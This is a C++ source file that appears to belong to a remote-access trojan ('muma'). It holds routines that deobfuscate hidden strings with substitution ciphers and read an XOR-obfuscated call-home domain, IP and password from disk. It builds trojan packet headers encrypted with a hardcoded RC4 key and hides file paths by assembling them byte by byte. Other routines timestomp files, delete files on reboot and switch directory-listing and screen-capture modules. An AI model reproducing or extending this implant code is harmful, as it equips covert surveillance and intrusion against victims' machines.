// mumaPublic.cpp: implementation of the mumaPublic class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include <io.h>
#include "math.h"
#include "assert.h"
#include "Base.h"
#include "mumaPublic.h"
#include "WinApi.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
extern UCHAR Ipnum;
extern ULONG LocalIpLst[4];
extern ULONG v_IpAgent;

extern char			v_Remark[100];			// 备注
extern unsigned int	v_RemarkLen;	// 备注的长度

extern char			v_Password[MAX_PATH];	//上线密码
extern unsigned int	v_PasswordLen;
extern char			v_TroInfo[300];
extern unsigned int v_TroInfoLen;

//////////////////////////////////////////////////////////////////////////
//
BOOL g_isHeartOk = TRUE;

//////////////////////////////////////////////////////////////////////////
//
//tFZhmGcqH-T_bkor6VauQByiEv70Xpj18C2sgJ:dlfDKzxn345NWR9/Y.MUIOPASLwe
#define DEPUBLIC_LEN 67
char *DepubStringA(char *ret_string, int strlen, char *string)
{
	char alphabet[DEPUBLIC_LEN]={'t','F','Z','h','m','G','c','q','H','-',
		'T','_','b','k','o','r','6','V','a','u',
		'Q','B','y','i','E','v','7','0','X','p',
		'j','1','8','C','2','s','g','J',':','d',
		'l','f','D','K','z','x','n','3','4','5',
		'N','W','R','9','/','Y','.','M','U','I',
		'O','P','A','S','L','w','e'};
	DWORD i,j, scramble=1;
	_snprintf(ret_string, strlen, "%s", string);
	for (i=0; ret_string[i]; i++) {
		for (j=0; j<DEPUBLIC_LEN; j++)
			if (ret_string[i] == alphabet[j]) {
				ret_string[i] = alphabet[(j+scramble)%DEPUBLIC_LEN];
				break;
			}
	}
	return ret_string;
}

//kFVyhfAomPNJZDCwdentKGOjEULYTSIsX-uMHclWziRxbrav
#define DEFILE_LEN 48
char *DeFileStringA(char *ret_string, int strlen, char *string)
{
	char alphabet[DEFILE_LEN]={'k','F','V','y','h','f','A','o','m','P',
		'N','J','Z','D','C','w','d','e','n','t',
		'K','G','O','j','E','U','L','Y','T','S',
		'I','s','X','-','u','M','H','c','l','W',
		'z','i','R','x','b','r','a','v'};
	DWORD i,j, scramble=17;
	_snprintf(ret_string, strlen, "%s", string);
	for (i=0; ret_string[i]; i++) {
		for (j=0; j<DEFILE_LEN; j++)
			if (ret_string[i] == alphabet[j]) {
				ret_string[i] = alphabet[(j+scramble)%DEFILE_LEN];
				break;
			}
		}
	return ret_string;
}

//RrXcSOtnohdDZwMYiIVUzExPCNaHKfuWsekv-GLJFjAbmlTy
#define DEFILE_LENW 48
WCHAR *DeFileStringW(WCHAR *ret_string, int strlen, WCHAR *string)
{
	WCHAR alphabet[DEFILE_LENW]={L'R',L'r',L'X',L'c',L'S',L'O',L't',L'n',L'o',L'h',
		L'd',L'D',L'Z',L'w',L'M',L'Y',L'i',L'I',L'V',L'U',
		L'z',L'E',L'x',L'P',L'C',L'N',L'a',L'H',L'K',L'f',
		L'u',L'W',L's',L'e',L'k',L'v',L'-',L'G',L'L',L'J',
		L'F',L'j',L'A',L'b',L'm',L'l',L'T',L'y'};
	DWORD i,j, scramble=17;
	_snwprintf(ret_string, strlen, L"%s", string);
	for (i=0; ret_string[i]; i++) {
		for (j=0; j<DEFILE_LENW; j++)
			if (ret_string[i] == alphabet[j]) {
				ret_string[i] = alphabet[(j+scramble)%DEFILE_LENW];
				break;
			}
	}
	return ret_string;
}


//u67cedwfJAzsGKySl8ba29tDgrLhq15noFim.j34px0vkH
#define RUNSTR_LEN 46
char *DeRunStringA(char *ret_string, int strlen, char *string)
{
	char alphabet[RUNSTR_LEN]={'u','6','7','c','e','d','w','f','J','A',
		'z','s','G','K','y','S','l','8','b','a',
		'2','9','t','D','g','r','L','h','q','1',
		'5','n','o','F','i','m','.','j','3','4',
		'p','x','0','v','k','H'};
	DWORD i,j, scramble=7;
	_snprintf(ret_string, strlen, "%s", string);
	for (i=0; ret_string[i]; i++) {
		for (j=0; j<RUNSTR_LEN; j++)
			if (ret_string[i] == alphabet[j]) {
				ret_string[i] = alphabet[(j+scramble)%RUNSTR_LEN];
				break;
			}
	}
	return ret_string;
}

//r92i45zetq0ax:6jynks7ob-lgdmh1uv83cwpf
#define PROCESSSTR_LEN 38
char *DeProcessStrA(char *ret_string, int strlen, char *string)
{
	char alphabet[PROCESSSTR_LEN]={'r','9','2','i','4','5','z','e','t','q',
		'0','a','x',':','6','j','y','n','k','s',
		'7','o','b','-','l','g','d','m','h','1',
		'u','v','8','3','c','w','p','f'};
	DWORD i,j, scramble=5;
	_snprintf(ret_string, strlen, "%s", string);
	for (i=0; ret_string[i]; i++) {
		for (j=0; j<PROCESSSTR_LEN; j++)
			if (ret_string[i] == alphabet[j]) {
				ret_string[i] = alphabet[(j+scramble)%PROCESSSTR_LEN];
				break;
			}
		}
	return ret_string;
}

//Ym:5BOdLou0HGbUIFEkN8e.hQXrl7Z9CDptq4MwRv6j1yxWnzai2fSs3gTPKJAcV
#define SYSINF_LEN 64
char *SysinfStringA(char *ret_string, int strlen, char *string)
{
	char alphabet[SYSINF_LEN]={'Y','m',':','5','B','O','d','L','o','u',
		'0','H','G','b','U','I','F','E','k','N',
		'8','e','.','h','Q','X','r','l','7','Z',
		'9','C','D','p','t','q','4','M','w','R',
		'v','6','j','1','y','x','W','n','z','a',
		'i','2','f','S','s','3','g','T','P','K',
		'J','A','c','V'};
	DWORD i,j, scramble=1;
	_snprintf(ret_string, strlen, "%s", string);
	for (i=0; ret_string[i]; i++) {
		for (j=0; j<SYSINF_LEN; j++)
			if (ret_string[i] == alphabet[j]) {
				ret_string[i] = alphabet[(j+scramble)%SYSINF_LEN];
				break;
			}
	}
	return ret_string;
}

//////////////////////////////////////////////////////////////////////////
//
int SignType = 0;

DWORD MakeHeadBuff(char *hdrBuf, int &offMumaHead, UCHAR PacketType)
{
	int headlen=0;
	int datalen;
	SendPacketHead	*pSendPacketHead=(SendPacketHead*)hdrBuf;
	ULONG	*s2=0;
	
	//af 7d a7 38 eb f9 f7 47 22aaa4d070df6fe4,前8位是标示。fa7da738ebf9f74731c1ea8188758043
	s2=(ULONG *)(&hdrBuf[4]);
	*s2=0x47f7f9eb;
	s2=(ULONG *)(&hdrBuf[0]);
	*s2=0x38a77daf;
	
	if (SignType == 11)
	{
		pSendPacketHead->TroType = 1;
	}
	else if (SignType == 22)
	{
		pSendPacketHead->TroType = 2;
	}
	else
	{
		pSendPacketHead->TroType = 0;
	}
	
	pSendPacketHead->TroNo = v_IpAgent;
	pSendPacketHead->TroVersion = VERSION_TROJ;
	pSendPacketHead->PacketType = PacketType;
	
	int offset = SENDPACKETHEADLEN+1;				//标志头的长度为16，再空出1字节用来保存长度
	int MaxLen = SENDPACKETHEADLEN+1+255;			//木马信息加上木马头的最大长度
	
	if(v_RemarkLen > 0 && offset+2+v_RemarkLen <= MaxLen)		// 若有用户信息
	{
		//备注信息
		memcpy(hdrBuf+offset, "\x06", 1);
		offset += 1;
		memcpy(hdrBuf+offset, &v_RemarkLen, 1);
		offset += 1;
		memcpy(hdrBuf+offset, v_Remark, v_RemarkLen);
		offset += v_RemarkLen;
	}
	
	if(v_PasswordLen>0 && offset+2+v_PasswordLen <= MaxLen)
	{
		//上线密码
		memcpy(hdrBuf+offset, "\x03", 1);
		offset += 1;
		memcpy(hdrBuf+offset, &v_PasswordLen, 1);
		offset += 1;
		memcpy(hdrBuf+offset, v_Password, v_PasswordLen);
		offset += v_PasswordLen;
	}

	if(v_TroInfoLen>0 && offset+2+v_TroInfoLen <= MaxLen)
	{
		//mm信息
		memcpy(hdrBuf+offset, "\x05", 1);
		offset += 1;
		memcpy(hdrBuf+offset, &v_TroInfoLen, 1);
		offset += 1;
		memcpy(hdrBuf+offset, v_TroInfo, v_TroInfoLen);
		offset += v_TroInfoLen;
	}
	
	datalen = offset-SENDPACKETHEADLEN-1;
	memcpy(hdrBuf+SENDPACKETHEADLEN, &datalen, 1);
	
	offMumaHead=offset;
	headlen=sizeof(MumaHead)+offset;
	
	return headlen;
}

BOOL GetTroPath(char *path)
{
	if(path==NULL)	//参数错误
		return FALSE;
	
	memset(path,0,MAX_PATH);
	unsigned char tmp[2*MAX_PATH+10];
	HKEY hkey;
	unsigned long type;
	long res;
	unsigned long len;

	if(PRegOpenKeyExA(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
		0,
		KEY_QUERY_VALUE,
		&hkey)!=ERROR_SUCCESS)	//打开键失败
	{
		return FALSE;
	}
	
	len=2*MAX_PATH+10-1;
	res=PRegQueryValueExA(hkey,"Common AppData",0,&type,tmp,&len);
	
	PRegCloseKey(hkey);
	
	if(res!=ERROR_SUCCESS||type!=REG_SZ)	//查询键值失败,或者值类型不是字符串
		return FALSE;
	
	strcpy(path,(const char *)tmp);
	
	return TRUE;
}

BOOL GetTroPathW(WCHAR *path)
{
	if(path==NULL)	//参数错误
		return FALSE;
	
	memset(path, 0, sizeof(path));
	unsigned char tmp[2*MAX_PATH+10];
	HKEY hkey;
	unsigned long type;
	long res;
	unsigned long len;
	
	if(PRegOpenKeyExW(HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
		0,
		KEY_QUERY_VALUE,
		&hkey)!=ERROR_SUCCESS)	//打开键失败
	{
		return FALSE;
	}
	
	len=2*MAX_PATH+10-1;
	res=PRegQueryValueExW(hkey, L"Common AppData", 0, &type, tmp, &len);
	
	PRegCloseKey(hkey);
	
	if(res!=ERROR_SUCCESS||type!=REG_SZ)	//查询键值失败,或者值类型不是字符串
		return FALSE;
	
	wcscpy(path, (WCHAR *)tmp);
	
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//
void CryptRemoteInfo(char* p, int len)
{
	//static const char *xorString = "f3s%42sdf";
	char xorString[10];
	xorString[9]='\0';
	xorString[3]='%';
	xorString[5]='2';
	xorString[1]='3';
	xorString[4]='4';
	xorString[7]='d';
	xorString[0]='f';
	xorString[8]=xorString[0];
	xorString[2]='s';
	xorString[6]=xorString[2];

	int idxXor;
	for(int i = 0; i< len; i+=9)
	{
		idxXor = 0;
		if(i+9 < len)
			idxXor = 9;
		else
			idxXor = len-i;
		for(int j = 0; j<idxXor; j++)
			p[i+j] ^= xorString[j];
	}
} 

void RemoteFileContent(LPCSTR filepath, char* p, DWORD& plen, BOOL bGet)
{
	char* type;
	if(bGet)
		type = "rb";
	else
		type = "wb";
	FILE* file = fopen(filepath, type);
	if(file)
	{
		if(bGet)
		{
			int filelen = _filelength(file->_file);
			plen = min(plen, filelen);
			fread(p, 1, plen, file);
		}
		else
			fwrite(p, 1, plen, file);
		fclose(file);
	}
	else if(bGet)
	{
		plen = 0;
	}
}

BOOL GetRemoteInfo(pRemoteInfo rinfo)
{
	BOOL bRemoteIP, bRemark, bdomain, bPassword;
	bRemark = bRemoteIP = bdomain = bPassword = FALSE;

	char FilePath[MAX_PATH];
	char tropath[MAX_PATH];
	if(GetTroPath(tropath)==FALSE)
		return FALSE;
	
	char chrAgent[1024];
	DWORD dwAgent;

	//%s\Compatible
	char PrintStr1[14];
	PrintStr1[0] = 0x25;
	PrintStr1[1] = 0x73;
	PrintStr1[2] = 0x5c;
	PrintStr1[3] = 0x43;
	PrintStr1[4] = 0x6f;
	PrintStr1[5] = 0x6d;
	PrintStr1[6] = 0x70;
	PrintStr1[7] = 0x61;
	PrintStr1[8] = 0x74;
	PrintStr1[9] = 0x69;
	PrintStr1[10] = 0x62;
	PrintStr1[11] = 0x6c;
	PrintStr1[12] = 0x65;
	PrintStr1[13] = 0x00;

	//%s\domain
	char PrintStr2[10];
	PrintStr2[0] = 0x25;
	PrintStr2[1] = 0x73;
	PrintStr2[2] = 0x5c;
	PrintStr2[3] = 0x64;
	PrintStr2[4] = 0x6f;
	PrintStr2[5] = 0x6d;
	PrintStr2[6] = 0x61;
	PrintStr2[7] = 0x69;
	PrintStr2[8] = 0x6e;
	PrintStr2[9] = 0x00;

	//%s\pw
	char PrintStr3[6];
	PrintStr3[0] = 0x25;
	PrintStr3[1] = 0x73;
	PrintStr3[2] = 0x5c;
	PrintStr3[3] = 0x70;
	PrintStr3[4] = 0x77;
	PrintStr3[5] = 0x00;

	//%s\Company
	char PrintStr4[11];
	PrintStr4[0] = 0x25;
	PrintStr4[1] = 0x73;
	PrintStr4[2] = 0x5c;
	PrintStr4[3] = 0x43;
	PrintStr4[4] = 0x6f;
	PrintStr4[5] = 0x6d;
	PrintStr4[6] = 0x70;
	PrintStr4[7] = 0x61;
	PrintStr4[8] = 0x6e;
	PrintStr4[9] = 0x79;
	PrintStr4[10] = 0x00;

	//目标位置
	sprintf(FilePath, PrintStr1, tropath);
	dwAgent = 1024;
	memset(chrAgent, 0, sizeof(chrAgent));
	
	RemoteFileContent(FilePath, chrAgent, dwAgent, TRUE);
	if(dwAgent > 0)
	{
		bRemark = TRUE;
		CryptRemoteInfo(chrAgent, dwAgent);
		strncpy(rinfo->remark, chrAgent, 50-1);
	}

	//域名
	sprintf(FilePath, PrintStr2, tropath);
	dwAgent = 1024;
	memset(chrAgent, 0, sizeof(chrAgent));
	RemoteFileContent(FilePath, chrAgent, dwAgent, TRUE);
	if(dwAgent > 0)
	{
		bdomain = TRUE;
		CryptRemoteInfo(chrAgent, dwAgent);
		strncpy(rinfo->remotedomain, chrAgent, MAX_PATH-1);
	}

	//上线密码
	sprintf(FilePath, PrintStr3, tropath);
	dwAgent = 1024;
	memset(chrAgent, 0, sizeof(chrAgent));
	RemoteFileContent(FilePath, chrAgent, dwAgent, TRUE);

	if(dwAgent > 0)
	{
		bPassword = TRUE;
		CryptRemoteInfo(chrAgent, dwAgent);
		strncpy(rinfo->password, chrAgent, 50-1);
	}

	//远程IP
	sprintf(FilePath, PrintStr4, tropath);
	dwAgent = 4;
	memset(chrAgent, 0, sizeof(chrAgent));
	RemoteFileContent(FilePath, chrAgent, dwAgent, TRUE);

	if(dwAgent == 4)
	{
		bRemoteIP = TRUE;
		rinfo->remoteIP = Pntohl(*(DWORD*)chrAgent);
	}
	
	//备用IP
	sprintf(FilePath, "%s\\reserve", tropath);
	dwAgent = 4;
	memset(chrAgent, 0, sizeof(chrAgent));
	RemoteFileContent(FilePath, chrAgent, dwAgent, TRUE);
	
	if(dwAgent == 4)
	{
		rinfo->ReserveIp = Pntohl(*(DWORD*)chrAgent);
	}

	//头标志
	sprintf(FilePath, "%s\\hs", tropath);
	dwAgent = 1;
	memset(chrAgent, 0, sizeof(chrAgent));
	RemoteFileContent(FilePath, chrAgent, dwAgent, TRUE);
	
	if(dwAgent == 1)
	{
		rinfo->HeadSign = *(BYTE*)chrAgent;
	}

	//其他信息
	sprintf(FilePath, "%s\\othinf", tropath);
	dwAgent = 1024;
	memset(chrAgent, 0, sizeof(chrAgent));
	RemoteFileContent(FilePath, chrAgent, dwAgent, TRUE);

	if(dwAgent > 0)
	{
		CryptRemoteInfo(chrAgent, dwAgent);
		strncpy(rinfo->troinfo, chrAgent, 300-1);
	}

	NewGetRemoteInfo(rinfo, tropath);

	return (bRemoteIP || bRemark || bdomain || bPassword);
}

//每个数据块占50的整数倍字节的大小，数据前面有三字节，一字节表示类型，两字节表示长度
#define ONEDATA 50

BOOL SetRemoteInfo(char *psetbuf, int setbuflen, int settype, char *tropath)
{
	char FilePath[MAX_PATH];
	sprintf(FilePath, "%s\\windows.inf", tropath);

	DWORD buflen;
	char* buf;
	FILE *fp = fopen(FilePath, "rb");
	if(fp == NULL)
	{
		buflen = 0;
		buf = NULL;
	}
	else
	{
		fseek(fp, 0, SEEK_END);
		buflen = ftell(fp);
		fseek(fp, 0, SEEK_SET);

		buf = new char[buflen];
		fread(buf, 1, buflen, fp);
		fclose(fp);
	}

	int addlen = ((setbuflen+3)/ONEDATA+1)*ONEDATA;
	int endlen = buflen + addlen;
	char* endbuf = new char[endlen];

	int offset=0;
	char * pbuf=buf;
	BOOL bFind = FALSE;
	while(offset<buflen)
	{
		UCHAR type;
		int len, onebuflen;
		
		type=pbuf[0];
		len=(USHORT)pbuf[1];
		onebuflen = ((len+3)/ONEDATA+1)*ONEDATA;

		if (type == settype)
		{
			bFind = TRUE;
			if (addlen != onebuflen)
			{
				memcpy(endbuf, buf, offset);
				memset(endbuf+offset, 0, addlen);
				memcpy(endbuf+offset, (UCHAR *)&settype, 1);
				memcpy(endbuf+offset+1, (USHORT *)&setbuflen, 2);
				memcpy(endbuf+offset+3, psetbuf, setbuflen);
				if(buflen > offset+onebuflen)
					memcpy(endbuf+offset+addlen, pbuf+onebuflen, buflen-offset-onebuflen);
				endlen = buflen + addlen - onebuflen;
			}
			else
			{
				memcpy(pbuf+1, (USHORT *)&setbuflen, 2);
				memcpy(pbuf+3, psetbuf, setbuflen);
				memcpy(endbuf, buf, buflen);
				endlen = buflen;
			}
			break;
		}
		
		pbuf += onebuflen;
		offset += onebuflen;
	}

	if (bFind == FALSE)
	{
		if (buflen > 0)
		{
			memcpy(endbuf, buf, buflen);
		}
		memset(endbuf+buflen, 0, addlen);
		memcpy(endbuf+buflen, (UCHAR *)&settype, 1);
		memcpy(endbuf+buflen+1, (USHORT *)&setbuflen, 2);
		memcpy(endbuf+buflen+3, psetbuf, setbuflen);
	}

	fp = fopen(FilePath, "wb");
	if(fp == NULL)
	{
		return FALSE;
	}

	fwrite(endbuf, 1, endlen, fp);
	fclose(fp);

	if (buf)
	{
		delete []buf;
		buf = NULL;
	}

	if (endbuf)
	{
		delete []endbuf;
		endbuf = NULL;
	}

	return TRUE;
}

BOOL NewGetRemoteInfo(pRemoteInfo &rinfo, char *tropath)
{
	char FilePath[MAX_PATH];
	sprintf(FilePath, "%s\\windows.inf", tropath);

	FILE *fp = fopen(FilePath, "rb");
	if(fp == NULL)
	{
		return FALSE;
	}
	
	fseek(fp, 0, SEEK_END);
	DWORD buflen = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	
	char* buf = new char[buflen];
	fread(buf, 1, buflen, fp);
	fclose(fp);

	int offset=0;
	char * pbuf=buf;
	while(offset<buflen)
	{
		UCHAR type;
		int len, onebuflen;

		type=pbuf[0];
		len=(USHORT)pbuf[1];
		switch(type)
		{
		case 1:     //Compatible 目标位置
		
			break;
		case 2:		//domain
			
			break;
		case 3:		//Company
			
			break;
		case 4:		//pw
			
			break;
		case 5:		//reserve
			
			break;
		case 6:		//hs
			
			break;
		case 7:		//othinf
			
			break;
		case 8:		//datastate
			GetDataState(pbuf+3, len, true);
			break;
		};
		
		onebuflen = (len/256+1)*256;
		pbuf += onebuflen + 3;
		offset += onebuflen + 3;
	}

	if (buf)
	{
		delete []buf;
		buf = NULL;
	}

	return TRUE;
}

void GetDataState(char *pbuf, int len, bool bCrypt)
{
	if (bCrypt)
	{
		CryptRemoteInfo(pbuf, len);
	}

	vector<string> StateArr;
	StateArr.clear();
	Split(pbuf, len, ",", StateArr);

	for (int i = 0; i < StateArr.size(); i++)
	{
		int tmpnum = atoi(StateArr[i].c_str());
		switch(tmpnum)
		{
		case 10 :
			g_dirwork = FALSE;
			break;
		case 11:
			g_dirwork = TRUE;
			break;
		case 20 :
			g_md5work = FALSE;
			break;
		case 21:
			g_md5work = TRUE;
			break;
		case 30 :
			g_screenwork = FALSE;
			break;
		case 31:
			g_screenwork = TRUE;
			break;
		}
	}

	return;
}

//////////////////////////////////////////////////////////////////////////
///
void rc4_setup( struct rc4_state *s, unsigned char *key,  int length )
{
    int i, j, k, *m, a;
	
    s->x = 0;
    s->y = 0;
    m = s->m;
	
    for( i = 0; i < 256; i++ )
    {
        m[i] = i;
    }
	
    j = k = 0;
	
    for( i = 0; i < 256; i++ )
    {
        a = m[i];
        j = (unsigned char) ( j + a + key[k] );
        m[i] = m[j]; m[j] = a;
        if( ++k >= length ) k = 0;
    }
}

void rc4_crypt( struct rc4_state *s, unsigned char *data, int length )
{ 
    int i, x, y, *m, a, b;
	
    x = s->x;
    y = s->y;
    m = s->m;
	
    for( i = 0; i < length; i++ )
    {
        x = (unsigned char) ( x + 1 ); a = m[x];
        y = (unsigned char) ( y + a );
        m[x] = b = m[y];
        m[y] = a;
        data[i] ^= m[(unsigned char) ( a + b )];
     }
	
    s->x = x;
    s->y = y;
}

//加密
BOOL BufferEncrypt(char * buff,int len,int offest)
{	
	BOOL re = FALSE;
	//key——fa7da738ebf9f74731c1ea8188758043
	struct rc4_state s;
	UCHAR Key[16];
	ULONG	*s2=0;
	s2=(ULONG *)(&Key[4]);
	*s2=0x47f7f9eb;
	s2=(ULONG *)(&Key[8]);
	*s2=0x81eac131;
	s2=(ULONG *)(&Key[0]);
	*s2=0x38a77dfa;
	s2=(ULONG *)(&Key[12]);
	*s2=0x43807588;

	if (len > offest)
	{
		rc4_setup( &s, Key, 16);
		rc4_crypt( &s, (UCHAR *)buff+offest, len-offest);
		re =TRUE;
	}

	return re;
}

//解密
BOOL BufferDecrypt(char * buff,int len,int offest)
{
	//fa7da738ebf9f747
	UCHAR tmpkey[9];
	tmpkey[0] = 0xaf;
	tmpkey[1] = 0x7d;
	tmpkey[2] = 0xa7;
	tmpkey[3] = 0x38;
	tmpkey[4] = 0xeb;
	tmpkey[5] = 0xf9;
	tmpkey[6] = 0xf7;
	tmpkey[7] = 0x47;
	tmpkey[8] = 0x00;

	BOOL re = FALSE;
	if (memcmp(buff+offest-16, tmpkey, 8) != 0)
		return FALSE;

	//key——fa7da738ebf9f74731c1ea8188758043
	struct rc4_state s;
	UCHAR Key[16];
	ULONG	*s2=0;
	s2=(ULONG *)(&Key[4]);
	*s2=0x47f7f9eb;
	s2=(ULONG *)(&Key[8]);
	*s2=0x81eac131;
	s2=(ULONG *)(&Key[0]);
	*s2=0x38a77dfa;
	s2=(ULONG *)(&Key[12]);
	*s2=0x43807588;

	if (len > offest)
	{
		rc4_setup( &s, Key, 16);
		rc4_crypt( &s, (UCHAR *)buff+offest, len-offest);
		re =TRUE;
	}

	return re;
}

char * GetFormatIP(const char * szIP)
{
	static char strIP[20];

	int ip1, ip2, ip3, ip4;
	unsigned int nip;
	
	int num = sscanf(szIP, "%d.%d.%d.%d", &ip1, &ip2, &ip3, &ip4);
	
	if(num != 4)
		return "";
	
	if(ip1 < 0 || ip1 > 255)
		return "";
	
	if(ip2 < 0 || ip2 > 255)
		return "";
	
	if(ip3 < 0 || ip3 > 255)
		return "";
	
	if(ip4 < 0 || ip4 > 255)
		return "";
	
	nip = ip1*pow(256, 3) + ip2*pow(256, 2) + ip3*pow(256, 1) + ip4*pow(256, 0);
	
	sprintf(strIP, "%u", nip);

	return strIP;
}

//////////////////////////////////////////////////////////////////////////
// 
int LineParser(char * inputline,char ** nextline,char **field,char ** value){
	//
	*nextline=strstr(inputline,"\r\n");
	if(*nextline!=NULL){
		**nextline=0;
		*nextline+=2;
	}
	else
		return 0;
	//
	*value=strstr(inputline,": ");
	if(*value!=NULL){
		**value=0;
		*value+=2;
	}
	else
		return 0;
	*field=inputline;
	if(memcmp(*nextline,"\r\n",2)==0){
		**nextline=0;
		*nextline+=2;
		return 2;
	}
	else
		return 1;
}

BOOL DbgFat32Log(const char* fm, ...)
{
	char Msg[1024*4];
	char *p = Msg;
	va_list args;
	va_start( args, fm );
	p += vsprintf( p, fm, args);
	va_end( args );
	strcat(Msg, "\r\n");
	POutputDebugStringA(Msg);
 	
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
// User Agent 相关
ULONG GetVirtualServerIp()
{
	//  return 0XE901a8c0;	// 192.168.1.233
	//	return 0X448966ca;	// 202.102.137.68
	UCHAR first[256];
	ULONG IP=0;
	memset(first,0,256);
	srand(time(0));
	IP=rand();
	IP<<=16;
	IP+=rand();
	IP&=0xffffff00;
	for(int i=0;i<Ipnum;i++){
		first[*(UCHAR *)(&LocalIpLst[i])]=1;
		if(i==15)
			break;
	}
	for(i=11;i<255;i++){
		if(first[i]==0)
			break;
	}
	IP += (i+rand()%10);
	IP |= 0xC0;
	return IP;
}

//////////////////////////////////////////////////////////////////////////
// 重启后删除
void BootNTRemove(const char* filename)
{
	try
	{
		PSetFileAttributesA(filename, FILE_ATTRIBUTE_ARCHIVE);
		PMoveFileExA(filename, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
	}
	catch (...)
	{
	}
}

void BootNTRemoveW(const WCHAR * filename)
{
	PSetFileAttributesW(filename, FILE_ATTRIBUTE_ARCHIVE);
	PMoveFileExW(filename, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
}

void BootMoveFile(char* filename,char* dstname)
{
	try
	{
		PSetFileAttributesA(dstname, FILE_ATTRIBUTE_ARCHIVE);
		PMoveFileExA(dstname, 0, MOVEFILE_DELAY_UNTIL_REBOOT);
		PMoveFileExA(filename, dstname, MOVEFILE_DELAY_UNTIL_REBOOT|MOVEFILE_COPY_ALLOWED);
	}
	catch (...)
	{
	}
}

void BootMoveFileW(WCHAR* filename,WCHAR* dstname)
{
	try
	{
		PSetFileAttributesW(dstname, FILE_ATTRIBUTE_ARCHIVE);
		PMoveFileExW(dstname, 0, MOVEFILE_DELAY_UNTIL_REBOOT);
		PMoveFileExW(filename, dstname, MOVEFILE_DELAY_UNTIL_REBOOT|MOVEFILE_COPY_ALLOWED);
	}
	catch (...)
	{
	}
}

BOOL QueryRegValueF(HKEY hRoot, const char * szSubKey, const char * szName, /*out*/char* szPath, /*out*/DWORD& buflen)
{
	memset(szPath, 0, buflen);
	BOOL bRet = FALSE;
	HKEY hLocKey1;
	if(PRegOpenKeyExA(hRoot, 
		szSubKey, 0, KEY_READ, &hLocKey1)==ERROR_SUCCESS)
	{
		unsigned long num=300;
		DWORD ValueType;
		char Value[500];
		ZeroMemory(Value, 500);
		if(PRegQueryValueExA(	hLocKey1, szName, NULL, &ValueType,
			(unsigned char*)Value, &num)==ERROR_SUCCESS)
		{
			if(ValueType == REG_SZ)
			{
				if(buflen > num)
				{
					buflen = num;
					memcpy(szPath, Value, buflen);
					szPath[buflen] = 0;
					bRet = TRUE;
				}
			}
		}
		PRegCloseKey(hLocKey1);
	}
	
	return bRet;
}


// 修改文件或目录的时间, offHour偏移小时, offMinute偏移分分钟 
BOOL ModifyFileTime(LPCSTR pathname, int offHour, int offMinute)
{
	// 修改文件时间
	BOOL bOK = TRUE;
	HANDLE hDir = PCreateFileA(
		pathname,
		GENERIC_READ|GENERIC_WRITE,
		FILE_SHARE_READ|FILE_SHARE_DELETE,
		NULL, 
		OPEN_EXISTING,
		FILE_FLAG_BACKUP_SEMANTICS,
		NULL);
	if(hDir != INVALID_HANDLE_VALUE)
	{
		FILETIME ftime;
		FILETIME lpCreationTime; // 文件夹的创建时间 
		FILETIME lpLastAccessTime; // 对文件夹的最近访问时间 
		FILETIME lpLastWriteTime; // 对文件夹的最近修改时间 
		struct tm *when;
		time_t now = time(0);

		when = localtime( &now );
		if(when == NULL)
		{
			bOK = FALSE;
		}
		if(bOK)
		{
			when->tm_hour += offHour;
			when->tm_min += offMinute;
			now = mktime(when);
			when = localtime( &now );
			if(when == NULL)
				bOK = FALSE;
		}

		if(bOK)
		{
			SYSTEMTIME nowtm;
			nowtm.wYear = (WORD) (1900 + when->tm_year);
			nowtm.wMonth = (WORD) (1 + when->tm_mon);
			nowtm.wDayOfWeek = (WORD) when->tm_wday;
			nowtm.wDay = (WORD) when->tm_mday;
			nowtm.wHour = (WORD) when->tm_hour;
			nowtm.wMinute = (WORD) when->tm_min;
			nowtm.wSecond = (WORD) when->tm_sec;
			nowtm.wMilliseconds = 0;
			PSystemTimeToFileTime(&nowtm, &ftime);
			if(PGetFileTime(hDir, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime))
			{
				PLocalFileTimeToFileTime(&ftime, &lpLastWriteTime);	// 更新文件修改时间
			}
			else
			{
				PLocalFileTimeToFileTime(&ftime, &lpCreationTime);
				PLocalFileTimeToFileTime(&ftime, &lpLastAccessTime);
				PLocalFileTimeToFileTime(&ftime, &lpLastWriteTime);
			}
			PSetFileTime(hDir, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);
			CloseHandle(hDir);
		}
	}

	return bOK;
}

int GetFileContent(char* filename,DWORD& pbuffer,DWORD& datalen)
{
	char * buffer=NULL;
	int		Op = -1;
	DWORD	lsize = -1;
	if(_access(filename,0)==0)
	{
		HANDLE		hFile;
		//读取文本内容
		hFile = PCreateFileA(filename, 
			GENERIC_READ, 
			FILE_SHARE_READ, 
			NULL,
			OPEN_EXISTING, 
			0,
			NULL);
	
		if (hFile!=NULL && hFile!=INVALID_HANDLE_VALUE)
		{
			DWORD hsize=0;
			lsize = PGetFileSize(hFile, &hsize);
			if (hsize>0)
				lsize |= 0x80000000;
			
			if(lsize == 0)
				Op = 0;
			else
			{
				
				buffer = new char[lsize+1024];
				if(buffer)
				{
					PReadFile(hFile, buffer, lsize, &lsize, NULL);
					datalen += lsize;
					Op = 2;
				}
				else
				{
					Op=-1;
				}
			}
			CloseHandle(hFile);
		}
	}
	pbuffer=(DWORD)buffer;
	return Op;
}

int UTF_82Unicode(char*utf8, WCHAR* wszUtf8, int len)
{
	return PMultiByteToWideChar(CP_UTF8, 0, (LPCSTR)utf8, -1, wszUtf8, len);
}

int GB23122Unicode(char*gb2312, WCHAR* wsz, int len)
{
	return PMultiByteToWideChar(CP_ACP, 0, (LPCSTR)gb2312, -1, wsz, len);
}

int Unicode2UTF_8(WCHAR* wsunicode,char* buffer,int buflen)
{ 
	return PWideCharToMultiByte(CP_UTF8,NULL,wsunicode,-1,buffer,buflen,NULL,NULL);
}

int Unicode2GB2312(WCHAR* wsunicode,char* buffer,int buflen)
{ 
	return PWideCharToMultiByte(CP_ACP,NULL,wsunicode,-1,buffer,buflen,NULL,NULL);
}

